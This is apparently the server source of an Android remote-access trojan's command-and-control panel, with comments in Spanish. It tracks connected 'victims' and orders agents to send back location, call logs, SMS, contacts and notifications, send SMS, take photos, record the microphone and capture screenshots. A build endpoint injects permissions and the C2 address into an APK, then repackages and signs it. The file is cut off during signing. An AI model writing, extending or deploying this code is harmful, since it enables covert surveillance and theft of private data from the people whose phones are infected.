require('dotenv').config();
const path      = require('path');
const os        = require('os');
const fs        = require('fs');
const crypto    = require('crypto');
const express   = require('express');
const http      = require('http');
const cors      = require('cors');
const session   = require('express-session');
const rateLimit = require('express-rate-limit');
const bcrypt    = require('bcrypt');
const { spawn, exec } = require('child_process');
const socketIO  = require('socket.io');

const app    = express();
const server = http.createServer(app);
const io     = socketIO(server, {
  cors: {
    origin: 'http://localhost:3000',
    methods: ['GET', 'POST']
  }
});

// ————————————————————————————————————————————————————————————————
// In-memory stores para listeners dinámicos
// ————————————————————————————————————————————————————————————————
const listeningStatus  = {};
const dynamicServers   = {};
const dynamicSocketIOs = {};

// ————————————————————————————————————————————————————————————————
// Middlewares y archivos estáticos
// ————————————————————————————————————————————————————————————————

// ---- Session setup ----
if (!process.env.SESSION_SECRET) {
  console.warn('⚠️  SESSION_SECRET is not set. Using a random secret – all sessions will be invalidated on restart. Set SESSION_SECRET in .env for production.');
}
const sessionSecret = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const sessionMiddleware = session({
  secret: sessionSecret,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 8 * 60 * 60 * 1000 // 8 hours
  }
});

// ---- Admin credentials (loaded asynchronously at startup) ----
let adminUser = 'admin';
let adminHash = null;

(async () => {
  adminUser = process.env.ADMIN_USER || 'admin';
  if (process.env.ADMIN_PASSWORD_HASH) {
    adminHash = process.env.ADMIN_PASSWORD_HASH;
    console.log('✅ Admin credentials loaded from ADMIN_PASSWORD_HASH');
  } else if (process.env.ADMIN_PASSWORD) {
    console.warn('⚠️  ADMIN_PASSWORD provided as plaintext – hashing on startup. Set ADMIN_PASSWORD_HASH for production!');
    adminHash = await bcrypt.hash(process.env.ADMIN_PASSWORD, 12);
  } else {
    console.error('❌ No admin password configured! Set ADMIN_PASSWORD_HASH (bcrypt) or ADMIN_PASSWORD env var.');
    process.exit(1);
  }
})();

// ---- Auth helpers ----
function requireAuth(req, res, next) {
  if (req.session && req.session.authenticated) return next();
  if (req.headers['x-requested-with'] === 'XMLHttpRequest' || req.path.startsWith('/api/')) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  res.redirect('/login');
}

// ---- Login rate limiter (10 attempts per 15 min per IP) ----
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many login attempts. Please try again later.' }
});

// ---- General rate limiter for public pages (100 req / 15 min per IP) ----
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});

// ---- CSRF protection: session-stored token validated via X-CSRF-Token header ----
// Tokens are generated per-session and returned by GET /api/csrf-token.
// All authenticated state-changing requests must include the token in the
// X-CSRF-Token header. This satisfies the double-submit / synchronizer-token
// CSRF defence patterns.

function ensureCsrfToken(req, res, next) {
  if (req.session && !req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  }
  next();
}

function csrfProtect(req, res, next) {
  if (req.method === 'GET' || req.method === 'HEAD' || req.method === 'OPTIONS') return next();
  const token = req.headers['x-csrf-token'];
  const sessionToken = req.session && req.session.csrfToken;
  if (!token || !sessionToken || token !== sessionToken) {
    return res.status(403).json({ error: 'CSRF check failed.' });
  }
  // Also validate origin when present (defence-in-depth)
  const origin = req.headers.origin || req.headers.referer;
  if (origin) {
    try {
      if (new URL(origin).host !== req.headers.host) {
        return res.status(403).json({ error: 'CSRF check failed.' });
      }
    } catch (_) {
      return res.status(403).json({ error: 'CSRF check failed.' });
    }
  }
  next();
}

app.use(cors());
app.use(express.json());
app.use(sessionMiddleware);
app.use(ensureCsrfToken);

const publicDir = path.join(__dirname, 'app');

// ---- Public routes (no auth required) ----
app.get('/login', generalLimiter, (req, res) => {
  if (req.session && req.session.authenticated) return res.redirect('/');
  res.sendFile(path.join(publicDir, 'login.html'));
});

// Expose CSRF token to the frontend (requires a session but no auth)
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.session.csrfToken });
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required.' });
  }
  if (!adminHash) {
    return res.status(503).json({ error: 'Server credentials not yet initialized.' });
  }
  if (username !== adminUser) {
    return res.status(401).json({ error: 'Invalid credentials.' });
  }
  const match = await bcrypt.compare(password, adminHash);
  if (!match) {
    return res.status(401).json({ error: 'Invalid credentials.' });
  }
  req.session.regenerate((err) => {
    if (err) {
      console.error('Session regeneration error:', err);
      return res.status(500).json({ error: 'Session error.' });
    }
    req.session.authenticated = true;
    req.session.username = username;
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    res.json({ ok: true, csrfToken: req.session.csrfToken });
  });
});

app.post('/api/logout', csrfProtect, (req, res) => {
  req.session.destroy(() => {
    res.clearCookie('connect.sid');
    res.json({ ok: true });
  });
});

app.get('/api/me', requireAuth, (req, res) => {
  res.json({ username: req.session.username });
});

// ---- Apply auth and CSRF protection to all remaining routes ----
app.use(requireAuth);
app.use(csrfProtect);

app.use('/node_modules', express.static(path.join(__dirname, 'node_modules')));
app.use('/node_modules', express.static(path.join(__dirname, 'app/node_modules')));
app.use(express.static(publicDir));
app.use('/dist', express.static(path.join(publicDir, 'dist')));

// ————————————————————————————————————————————————————————————————
// ENDPOINT PARA CONFIGURACIÓN DINÁMICA
// ————————————————————————————————————————————————————————————————
app.get('/api/config', (req, res) => {
  const configPath = path.join(__dirname, 'config.json');
  fs.readFile(configPath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading config.json:', err);
      return res.status(500).json({ 
        error: 'Configuration file not found',
        SERVER_IP: '192.168.1.68',
        SERVER_PORT: 8000
      });
    }
    try {
      const config = JSON.parse(data);
      res.json(config);
    } catch(e) {
      console.error('Error parsing config.json:', e);
      res.status(500).json({ 
        error: 'Invalid configuration format',
        SERVER_IP: '192.168.1.68',
        SERVER_PORT: 8000
      });
    }
  });
});

// ————————————————————————————————————————————————————————————————
// ENDPOINT PARA NOTIFICACIONES
// ————————————————————————————————————————————————————————————————
app.get('/api/notifications/:victim', (req, res) => {
  const victimId = req.params.victim;
  const filePath = path.join(__dirname, 'notificaciones_' + victimId + '.log');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      return res.json([]);
    }
    const lines = data.split('\n').filter(line => line.trim() !== '');
    const notifications = lines.map(line => {
      try {
        return JSON.parse(line);
      } catch(parseError) {
        return {
          app: "Desconocida",
          content: line,
          time: new Date(),
          direction: ""
        };
      }
    });
    res.json(notifications);
  });
});

// —————————————————————————————————————————————————————————————————
// Socket.io auth middleware for admin namespace (main io on port 3000)
// ————————————————————————————————————————————————————————————————
const wrapSession = middleware => (socket, next) =>
  middleware(socket.request, socket.request.res || {}, next);

io.use(wrapSession(sessionMiddleware));
io.use((socket, next) => {
  const sess = socket.request.session;
  if (sess && sess.authenticated) return next();
  next(new Error('Unauthorized'));
});

// ————————————————————————————————————————————————————————————————
// Conexión WebSocket principal (UI)
// ————————————————————————————————————————————————————————————————
io.on('connection', socket => {
  console.log('🔌 Cliente WS conectado');
  
  // Handler para obtener ubicación (LOCATION)
  socket.on('get-location', ({ victimId }) => {
    console.log(`LOG [LOCATION] get-location recibido para: ${victimId}`);
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      console.log(`LOG [LOCATION] No hay dynIO para puerto: ${port}, victimId: ${victimId}`);
      socket.emit('location-data', { error: "No agent" });
      return;
    }

    const agents = Array.from(dynIO.sockets.sockets.values());
    console.log(`LOG [LOCATION] Agentes conectados en puerto ${port}: ${agents.length}`);
    if (!agents.length) {
      console.log(`LOG [LOCATION] No hay agentes conectados en puerto: ${port}`);
      socket.emit('location-data', { error: "No agent" });
      return;
    }

    const agent = agents[0];
    console.log(`LOG [LOCATION] Enviando get-location a agente [id=${agent.id}] en puerto: ${port}`);

    agent.emit('get-location', {});

    const timeout = setTimeout(() => {
      console.log(`LOG [LOCATION] Timeout esperando location-data del agente en puerto ${port}`);
      socket.emit('location-data', { error: "Timeout" });
    }, 20000);

    agent.once('location-data', (data) => {
      clearTimeout(timeout);
      console.log(`LOG [LOCATION] Respuesta location-data recibida del agente en puerto ${port}`);
      let parsedData = data;
      if (typeof data === 'string') {
        try {
          parsedData = JSON.parse(data);
        } catch (e) {
          console.error('LOG [LOCATION] Error parseando location-data:', e, data);
          parsedData = { error: "Parse error" };
        }
      }
      console.log('LOG [LOCATION] location-data para emitir al frontend:', JSON.stringify(parsedData, null, 2));
      socket.emit('location-data', parsedData || { error: "No data" });
    });
  });

  // Handler para obtener registro de llamadas
  socket.on('get-calls', ({ victimId }) => {
    console.log(`LOG [CALLS] get-calls recibido para: ${victimId}`);
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      console.log(`LOG [CALLS] No hay dynIO para puerto: ${port}, victimId: ${victimId}`);
      socket.emit('calls-data', []);
      return;
    }

    const agents = Array.from(dynIO.sockets.sockets.values());
    console.log(`LOG [CALLS] Agentes conectados en puerto ${port}: ${agents.length}`);
    if (!agents.length) {
      console.log(`LOG [CALLS] No hay agentes conectados en puerto: ${port}`);
      socket.emit('calls-data', []);
      return;
    }

    const agent = agents[0];
    console.log(`LOG [CALLS] Enviando get-calls a agente [id=${agent.id}] en puerto: ${port}`);

    agent.emit('get-calls', {});

    const timeout = setTimeout(() => {
      console.log(`LOG [CALLS] Timeout esperando calls-data del agente en puerto ${port}`);
      socket.emit('calls-data', []);
    }, 20000);

    agent.once('calls-data', (data) => {
      clearTimeout(timeout);
      console.log(`LOG [CALLS] Respuesta calls-data recibida del agente en puerto ${port}`);
      let parsedData = data;
      if (typeof data === 'string') {
        try {
          parsedData = JSON.parse(data);
        } catch (e) {
          console.error('LOG [CALLS] Error parseando calls-data:', e, data);
          parsedData = [];
        }
      }
      console.log('LOG [CALLS] calls-data para emitir al frontend:', JSON.stringify(parsedData, null, 2));
      socket.emit('calls-data', parsedData || []);
    });
  });

  // Handler para obtener lista de SMS
  socket.on('get-sms', ({ victimId }) => {
    console.log(`LOG [SMS] get-sms recibido para: ${victimId}`);
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      socket.emit('sms-data', []);
      return;
    }
    const agents = Array.from(dynIO.sockets.sockets.values());
    if (!agents.length) {
      socket.emit('sms-data', []);
      return;
    }
    const agent = agents[0];
    agent.emit('get-sms', {});
    const timeout = setTimeout(() => {
      socket.emit('sms-data', []);
    }, 5000);
    agent.once('sms-data', (data) => {
      clearTimeout(timeout);
      let parsedData = data;
      if (typeof data === 'string') {
        try {
          parsedData = JSON.parse(data);
        } catch (e) {
          parsedData = [];
        }
      }
      socket.emit('sms-data', parsedData || []);
    });
  });

  // Handler para enviar SMS
  socket.on('send-sms', ({ victimId, phoneNo, msg }) => {
    console.log(`[SMS] send-sms recibido para: ${victimId}, ${phoneNo}, ${msg}`);
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      socket.emit('send-sms-result', { ok: false, error: "No agent" });
      return;
    }
    const agents = Array.from(dynIO.sockets.sockets.values());
    if (!agents.length) {
      socket.emit('send-sms-result', { ok: false, error: "No agent" });
      return;
    }
    const agent = agents[0];
    agent.emit('send-sms', { phoneNo, msg });
    const timeout = setTimeout(() => {
      socket.emit('send-sms-result', { ok: false, error: "Timeout" });
    }, 5000);
    agent.once('send-sms-result', (data) => {
      clearTimeout(timeout);
      socket.emit('send-sms-result', data);
    });
  });

  // Handler para notificaciones
  socket.on('notification', (data) => {
    console.log("Notificación recibida por Socket.IO:", data);
    const victimId = socket.handshake.query.victimId || "desconocido";
    console.log("VictimId recibido en handshake:", victimId);
    const filePath = path.join(__dirname, 'notificaciones_' + victimId + '.log');
    const notification = {
      app: data.package || "Desconocida",
      title: data.title || "",
      content: data.text || "",
      direction: data.direction || "",
      time: new Date().toISOString()
    };
    fs.appendFile(filePath, JSON.stringify(notification) + "\n", (err) => {
      if (err) {
        console.error("Error guardando notificación:", err);
      } else {
        console.log(`Notificación guardada en archivo: ${filePath}`);
      }
    });
  });

  // HANDLERS DE CÁMARA (frontend)
  socket.on('get-camera-list', ({ victimId }) => {
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      socket.emit('camera-list', { camList: false, list: [] });
      return;
    }
    const agents = Array.from(dynIO.sockets.sockets.values());
    if (!agents.length) {
      socket.emit('camera-list', { camList: false, list: [] });
      return;
    }
    const agent = agents[0];
    agent.emit('get-camera-list', {});
    const timeout = setTimeout(() => {
      socket.emit('camera-list', { camList: false, list: [] });
    }, 5000);
    agent.once('camera-list', (data) => {
      clearTimeout(timeout);
      socket.emit('camera-list', data);
    });
  });

  // Handler para tomar foto
  socket.on('get-photo', ({ victimId, cameraID }) => {
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      socket.emit('x0000ca', { image: false, error: "No agent" });
      return;
    }
    const agents = Array.from(dynIO.sockets.sockets.values());
    if (!agents.length) {
      socket.emit('x0000ca', { image: false, error: "No agent" });
      return;
    }
    const agent = agents[0];
    const camID = parseInt(cameraID, 10);
    console.log("📷 Emitiendo get-photo con cameraID:", camID, "tipo:", typeof camID);
    agent.emit('get-photo', { cameraID: camID });
    const timeout = setTimeout(() => {
      socket.emit('x0000ca', { image: false, error: "Timeout" });
    }, 7000);
    agent.once('x0000ca', (data) => {
      clearTimeout(timeout);
      socket.emit('x0000ca', data);
    });
  });

  // ————————————————————————————————————————————
  // MICRÓFONO REMOTO
  // ————————————————————————————————————————————
  socket.on('mic-record', ({ victimId, seconds }) => {
    console.log(`[MIC] mic-record recibido para: ${victimId}, segundos: ${seconds}`);
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      socket.emit('mic-audio', { file: false, error: "No agent" });
      return;
    }
    const agents = Array.from(dynIO.sockets.sockets.values());
    if (!agents.length) {
      socket.emit('mic-audio', { file: false, error: "No agent" });
      return;
    }
    const agent = agents[0];
    console.log(`[MIC] Enviando mic-record al agente en puerto ${port}`);
    agent.emit('mic-record', { seconds: parseInt(seconds, 10) || 10 });

    const timeout = setTimeout(() => {
      console.log(`[MIC] Timeout esperando respuesta`);
      socket.emit('mic-audio', { file: false, error: "Timeout" });
    }, (parseInt(seconds, 10) || 10) * 1000 + 5000);

    agent.once('x0000mc', (data) => {
      clearTimeout(timeout);
      console.log(`[MIC] Recibido x0000mc del agente, file: ${data.file}, buffer size: ${data.buffer ? data.buffer.length : 0}`);
      
      if (data.error || !data.file) {
        console.log(`[MIC] Error recibido: ${data.error}`);
        socket.emit('mic-audio', { file: false, error: data.error || 'No audio received' });
        return;
      }

      try {
        let audioBase64;
        if (Buffer.isBuffer(data.buffer)) {
          audioBase64 = data.buffer.toString('base64');
        } else if (Array.isArray(data.buffer)) {
          audioBase64 = Buffer.from(data.buffer).toString('base64');
        } else {
          audioBase64 = Buffer.from(data.buffer).toString('base64');
        }
        console.log(`[MIC] Base64 generado, length: ${audioBase64.length}`);
        socket.emit('mic-audio', { 
          file: true,
          buffer: audioBase64,
          mimeType: 'audio/mp4',
          name: data.name 
        });
      } catch (e) {
        console.error(`[MIC] Error procesando buffer:`, e);
        socket.emit('mic-audio', { file: false, error: 'Error processing audio: ' + e.message });
      }
    });
  });

      // ————————————————————————————————————————————
  // SCREENSHOT REMOTO
  // ————————————————————————————���———————————————
  socket.on('get-screenshot', ({ victimId }) => {
    console.log(`[SCREENSHOT] get-screenshot recibido para: ${victimId}`);
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    
    if (!dynIO) {
      console.log(`[SCREENSHOT] No hay dynIO para puerto: ${port}`);
      socket.emit('screenshot-data', { error: "No agent" });
      return;
    }

    const agents = Array.from(dynIO.sockets.sockets.values());
    if (!agents.length) {
      console.log(`[SCREENSHOT] No hay agentes en puerto: ${port}`);
      socket.emit('screenshot-data', { error: "No agent" });
      return;
    }

    const agent = agents[0];
    const clientSocket = socket; // ✅ GUARDAR REFERENCIA CORRECTA
    console.log(`[SCREENSHOT] Enviando get-screenshot al agente en puerto: ${port}`);
    agent.emit('get-screenshot', {});

    const timeout = setTimeout(() => {
      console.log(`[SCREENSHOT] Timeout esperando respuesta`);
      clientSocket.emit('screenshot-data', { error: "Timeout" });
    }, 15000);

    agent.once('screenshot-data', (data) => {
      clearTimeout(timeout);
      console.log(`[SCREENSHOT] Respuesta recibida del agente`);
      console.log(`[SCREENSHOT] data.file:`, data.file);
      console.log(`[SCREENSHOT] data.buffer length:`, data.buffer ? data.buffer.length : 0);
      
      if (data.error || !data.file) {
        console.log(`[SCREENSHOT] Error:`, data.error);
        clientSocket.emit('screenshot-data', { error: data.error || 'No screenshot received' });
        return;
      }

            try {
        let imageBase64;
        
        if (Buffer.isBuffer(data.buffer)) {
          console.log(`[SCREENSHOT] Buffer es Buffer`);
          imageBase64 = data.buffer.toString('base64');
        } else if (Array.isArray(data.buffer)) {
          console.log(`[SCREENSHOT] Buffer es Array`);
          imageBase64 = Buffer.from(data.buffer).toString('base64');
        } else if (typeof data.buffer === 'string') {
          console.log(`[SCREENSHOT] Buffer es String`);
          // ✅ SI YA ES BASE64 VÁLIDO, USARLO DIRECTAMENTE
          if (/^[A-Za-z0-9+/=\n\r\t ]*$/.test(data.buffer)) {
            console.log(`[SCREENSHOT] ✅ Ya es base64, usando directamente`);
            imageBase64 = data.buffer.replace(/[\s\n\r\t]/g, ''); // Limpiar espacios
          } else {
            // Si no es base64, convertir a base64
            imageBase64 = Buffer.from(data.buffer).toString('base64');
          }
        } else {
          console.log(`[SCREENSHOT] Buffer es tipo: ${typeof data.buffer}`);
          imageBase64 = Buffer.from(data.buffer).toString('base64');
        }
        
        console.log(`[SCREENSHOT] Base64 final, length: ${imageBase64.length}`);
        console.log(`[SCREENSHOT] Base64 primeros 50 chars:`, imageBase64.substring(0, 50));
        
        clientSocket.emit('screenshot-data', {
          file: true,
          buffer: imageBase64
        });
      } catch (e) {
        console.error(`[SCREENSHOT] Error procesando buffer:`, e);
        clientSocket.emit('screenshot-data', { error: 'Error processing screenshot: ' + e.message });
      }
      });
      });
  // Handler para obtener contactos
  socket.on('get-contacts', ({ victimId }) => {
    console.log(`LOG [CONTACTS] get-contacts recibido para: ${victimId}`);
    const [ip, port] = victimId.split(':');
    const dynIO = dynamicSocketIOs[port];
    if (!dynIO) {
      console.log(`LOG [CONTACTS] No hay dynIO para puerto: ${port}, victimId: ${victimId}`);
      socket.emit('contacts-data', { error: "No agent", contactsList: [] });
      return;
    }

    const agents = Array.from(dynIO.sockets.sockets.values());
    console.log(`LOG [CONTACTS] Agentes conectados en puerto ${port}: ${agents.length}`);
    if (!agents.length) {
      console.log(`LOG [CONTACTS] No hay agentes conectados en puerto: ${port}`);
      socket.emit('contacts-data', { error: "No agent", contactsList: [] });
      return;
    }

    const agent = agents[0];
    console.log(`LOG [CONTACTS] Enviando get-contacts a agente [id=${agent.id}] en puerto: ${port}`);

    agent.emit('get-contacts', {});

    const timeout = setTimeout(() => {
      console.log(`LOG [CONTACTS] Timeout esperando contacts-data del agente en puerto ${port}`);
      socket.emit('contacts-data', { error: "Timeout", contactsList: [] });
    }, 5000);

    agent.once('contacts-data', (data) => {
      clearTimeout(timeout);
      console.log(`LOG [CONTACTS] Respuesta contacts-data recibida del agente en puerto ${port}`);
      let parsedData = data;
      if (typeof data === 'string') {
        try {
          parsedData = JSON.parse(data);
        } catch (e) {
          console.error('LOG [CONTACTS] Error parseando contacts-data:', e, data);
          parsedData = { error: "Parse error", contactsList: [] };
        }
      }
      socket.emit('contacts-data', parsedData ?? { error: "No data", contactsList: [] });
    });
  });
});

// ————————————————————————————————————————————————————————————————
// Victims Lab: arrancar listener en un puerto
// ————————————————————————————————————————————————————————————————
app.post('/api/listen', (req, res) => {
  const port = req.body.port;
  if (!port) return res.status(400).json({ error: 'Port is required' });
  if (listeningStatus[port]) return res.status(400).json({ error: 'Already listening on this port' });

  const dynServer = http.createServer();
  dynServer.setMaxListeners(50);

  const dynIO = socketIO(dynServer, { 
    cors: { origin: "*", methods: ["GET","POST"] },
    maxHttpBufferSize: 1024 * 1024 * 100 
  });
  dynIO.sockets.pingInterval = 10000;
  dynIO.sockets.pingTimeout  = 10000;

  dynIO.on('connection', socket => {
    const remote    = socket.request.connection;
    const ip        = remote.remoteAddress.replace(/^.*:/, '');
    const query     = socket.handshake.query || {};
    const { manf, model, release } = query;
    console.log(`[Victim ⬅] Puerto ${port}, IP=${ip}, manf=${manf}, model=${model}, release=${release}`);
    io.emit('newVictim', { id: `${ip}:${port}`, ip, port, manf, model, release, country: null });

    socket.on('disconnect', (reason) => {
      console.log(`[Victim ⬅] Desconectado puerto ${port}, IP=${ip}, razón=${reason}`);
      io.emit('victimDisconnected', { id: `${ip}:${port}`, ip, port, reason });
    });

    socket.on('error', (err) => {
      console.error(`[Victim ⬅] Error en socket puerto ${port}, IP=${ip}:`, err);
    });
    socket.on('connect_error', (err) => {
      console.error(`[Victim ⬅] Error de conexión en puerto ${port}, IP=${ip}:`, err);
    });

    // ————————————————————————————————————————————
    // LOCATION - respuesta del agente
    // ————————————————————————————————————————————
    socket.on('location-data', (data) => {
      console.log(`[LOCATION] location-data recibido del agente en puerto ${port}`);
      io.emit('location-data', data);
    });

    // ————————————��———————————————————————————————
    // CALLS - respuesta del agente
    // ————————————————————————————————————————————
    socket.on('calls-data', (data) => {
      let parsedData = data;
      if (typeof data === 'string') {
        try {
          parsedData = JSON.parse(data);
        } catch (e) {
          parsedData = [];
        }
      }
      io.emit('calls-data', parsedData || []);
    });

    // ————————————————————————————————————————————
    // SMS - respuesta del agente
    // ————————————————————————————————————————————
    socket.on('sms-data', (data) => {
      let parsedData = data;
      if (typeof data === 'string') {
        try {
          parsedData = JSON.parse(data);
        } catch (e) {
          parsedData = [];
        }
      }
      io.emit('sms-data', parsedData || []);
    });

    socket.on('send-sms-result', (data) => {
      io.emit('send-sms-result', data);
    });

    // ————————————————————————————————————————————
    // NOTIFICACIONES
    // ————————————————————————————————————————————
    socket.on('notification', (data) => {
      console.log("Notificación recibida por Socket.IO (dynIO):", data);
      const victimId = socket.handshake.query.victimId || `desconocido_${port}`;
      console.log("VictimId recibido en handshake (dynIO):", victimId);
      const filePath = path.join(__dirname, 'notificaciones_' + victimId + '.log');
      const notification = {
        app: data.package || "Desconocida",
        title: data.title || "",
        content: data.text || "",
        direction: data.direction || "",
        time: new Date().toISOString()
      };
      fs.appendFile(filePath, JSON.stringify(notification) + "\n", (err) => {
        if (err) {
          console.error("Error guardando notificación (dynIO):", err);
        } else {
          console.log(`Notificación guardada en archivo (dynIO): ${filePath}`);
        }
      });
    });

    // ————————————————————————————————————————————
    // CÁMARA - respuesta del agente
    // ————————————————————————————————————————————
    socket.on('camera-list', (data) => {
      io.emit('camera-list', data);
    });

    socket.on('x0000ca', (data) => {
      io.emit('x0000ca', data);
    });

    // —————————————————————————————————————————��——
    // MICRÓFONO - respuesta del agente
    // ————————————————————————————————————————————
    socket.on('x0000mc', (data) => {
      console.log(`[MIC] x0000mc recibido en puerto ${port}`);
      io.emit('x0000mc', data);
    });

    // ————————————————————————————————————————————
    // SCREENSHOT - respuesta del agente
    // ————————————————————————————————————————————
   // socket.on('screenshot-data', (data) => {
     // console.log(`[SCREENSHOT] screenshot-data recibido del agente en puerto ${port}`);
      //io.emit('screenshot-data', data);
    //});

    // ———————���————————————————————————————————————
    // CONTACTOS - respuesta del agente
    // ————————————————————————————————————————————
    socket.on('contacts-data', (data) => {
      console.log(`[CONTACTS] contacts-data recibido en puerto ${port}`);
      io.emit('contacts-data', data);
    });

  }); // ← FIN de dynIO.on('connection')

  dynServer.listen(port, '0.0.0.0', () => {
    listeningStatus[port]   = true;
    dynamicServers[port]    = dynServer;
    dynamicSocketIOs[port]  = dynIO;
    console.log(`🔊 Victims Lab listening on port ${port}`);
    res.json({ success: true });
  });
  dynServer.on('error', err => {
    console.error(`Error listening on port ${port}:`, err);
    res.status(500).json({ error: `Could not listen on port ${port}` });
  });
});

// ————————————————————————————————————————————————————————————————
// Victims Lab: parar listener en un puerto
// ————————————————————————————————————————————————————————————————
app.post('/api/stop', (req, res) => {
  const port = req.body.port;
  if (!port || !listeningStatus[port]) return res.status(400).json({ error: 'Not listening on this port' });

  dynamicServers[port].close(err => {
    if (err) {
      console.error(`Error closing port ${port}:`, err);
      return res.status(500).json({ error: `Could not close port ${port}` });
    }
    dynamicSocketIOs[port].close();
    listeningStatus[port] = false;
    delete dynamicServers[port];
    delete dynamicSocketIOs[port];
    console.log(`🛑 Victims Lab stopped on port ${port}`);
    res.json({ success: true });
  });
});

// ————————————————————————————————————————————————————————————————
// Configuración de Android SDK y Build-Tools
// ————————————————————————��———————————————————————————————————————
const defaultSdkRoot  = path.join(os.homedir(), 'Library', 'Android', 'sdk');
const sdkRoot         = process.env.ANDROID_SDK_ROOT || process.env.ANDROID_HOME || defaultSdkRoot;
console.log(`☁️ Using Android SDK at ${sdkRoot}`);
const buildToolsVer   = '29.0.2';
const buildToolsPath  = path.join(sdkRoot, 'build-tools', buildToolsVer);
const zipalignCmd     = path.join(buildToolsPath, process.platform === 'win32' ? 'zipalign.exe' : 'zipalign');
const apksignerCmd    = path.join(buildToolsPath, process.platform === 'win32' ? 'apksigner.bat' : 'apksigner');

// ————————————————————————————————————————————————————————————————
// APK Builder endpoint
// ————————————————————————————————————————————————————————————————
app.post('/api/build', async (req, res) => {
  const {
    projectDir, outputName,
    keystorePath, keystorePassword,
    keyAlias, keyPassword,
    permissions = []
  } = req.body;

  let serverIp, serverPort;
  try {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.promises.readFile(configPath, 'utf8');
    const config = JSON.parse(configData);
    serverIp = config.SERVER_IP;
    serverPort = config.SERVER_PORT;
    
    if (!serverIp || !serverPort) {
      throw new Error('SERVER_IP or SERVER_PORT missing in config.json');
    }
    
    io.emit('buildLog', `📡 Using dynamic config: ${serverIp}:${serverPort}`);
  } catch (err) {
    console.error('Error reading config.json for build:', err);
    io.emit('buildLog', `❌ Error: Could not read server configuration - ${err.message}`);
    return res.status(500).json({ 
      success: false, 
      message: `Configuration error: ${err.message}. Please ensure config.json exists and contains SERVER_IP and SERVER_PORT.`
    });
  }

  let projectPath = projectDir;
  if (!path.isAbsolute(projectPath)) projectPath = path.resolve(process.cwd(), projectPath);
  const wrapperPath = path.join(projectPath, 'gradlew');
  const gradleCmd   = fs.existsSync(wrapperPath) ? './gradlew' : 'gradle';

  const decodedDir = path.join(projectPath, 'app_decoded');
  const distDir    = path.join(publicDir, 'dist');
  fs.mkdirSync(distDir, { recursive: true });

  io.emit('buildStart', { outputName });
  try {
    await new Promise((ok, ko) => exec(`cd "${projectPath}" && ${gradleCmd} :app:assembleRelease`, err => err ? ko(err) : ok()));

    const apkFile  = `${outputName || 'app'}-release.apk`;
    const builtApk = path.join(projectPath, 'app', 'build','outputs','apk','release', apkFile);
    if (!fs.existsSync(builtApk)) throw new Error(`APK not found after build: ${builtApk}`);

    if (fs.existsSync(decodedDir)) fs.rmSync(decodedDir, { recursive: true, force: true });
    await new Promise((ok, ko) => {
      const p = spawn('apktool', ['d','-f', builtApk,'-o', decodedDir]);
      p.stdout.on('data', d => io.emit('buildLog', d.toString()));
      p.stderr.on('data', d => io.emit('buildLog', d.toString()));
      p.on('exit', code => code !== 0 ? ko(new Error(`apktool failed (${code})`)) : ok());
    }); io.emit('buildLog','🛠 APK decompiled');

    const manifestPath = path.join(decodedDir, 'AndroidManifest.xml');
    let manifest = fs.readFileSync(manifestPath,'utf8');
    if (permissions.length) {
      const permTags = permissions.map(p => `    <uses-permission android:name="${p.trim()}"/>`).join('\n');
      manifest = manifest.replace(/<manifest([^>]+)>/, `<manifest$1>\n${permTags}`);
    }
    const mdTags=[];
    if(serverIp)   mdTags.push(`<meta-data android:name=\"SERVER_IP\" android:value=\"${serverIp}\"/>`);
    if(serverPort) mdTags.push(`<meta-data android:name=\"SERVER_PORT\" android:value=\"${serverPort}\"/>`);
    if(mdTags.length) manifest = manifest.replace(/<application([^>]+)>/, `<application$1>\n${mdTags.join('\n')}`);
    fs.writeFileSync(manifestPath,manifest,'utf8'); io.emit('buildLog','⚙️ Manifest injected');

    const unsignedApk=path.join(distDir,`${outputName||'app'}-unsigned.apk`);
    const alignedApk =path.join(distDir,`${outputName||'app'}-aligned.apk`);
    const finalApk   =path.join(distDir,`${outputName||'app'}.apk`);
    await new Promise((ok, ko)=>{
      const p=spawn('apktool',['b',decodedDir,'-o',unsignedApk]);
      p.stderr.on('data',d=>io.emit('buildLog', d.toString()));
      p.on('exit',code=>code!==0?ko(new Error(`apktool build failed (${code})`)):ok());
    }); io.emit('buildLog','🔨 APK rebuilt');

    await new Promise((ok, ko)=>{
      const p=spawn(zipalignCmd,['-p','4', unsignedApk, alignedApk]);
      p.on('error',e=>ko(new Error(`zipalign exec failed: ${e.message}`)));
      p.stderr.on('data',d=>io.emit('buildLog', d.toString()));
      p.on('exit',code=>code!==0?ko(new Error(`zipalign failed (${code})`)):ok());
    }); io.emit('buildLog','🔧 APK aligned');

    await new Promise((ok, ko)=>{
      const p=spawn(apksignerCmd, [
        'sign','--ks',keystorePath,'--ks-pass',`pass:${keystorePassword}`,
        '--key-pass',`pass:${keyPassword}`,'--ks-key-alias',keyAlias,
        '--out', finalApk, alignedApk
      ]);
